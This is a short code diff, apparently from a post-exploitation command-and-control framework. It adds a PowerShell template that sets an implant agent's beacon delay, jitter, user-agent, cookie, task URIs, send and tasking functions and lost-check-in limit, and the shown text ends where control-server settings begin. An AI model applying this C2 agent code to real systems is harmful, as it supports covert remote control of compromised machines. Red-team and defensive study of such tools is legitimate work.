@@ -529,8 +529,47 @@ class Listener:
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     Cookie="{cookie}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
+
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
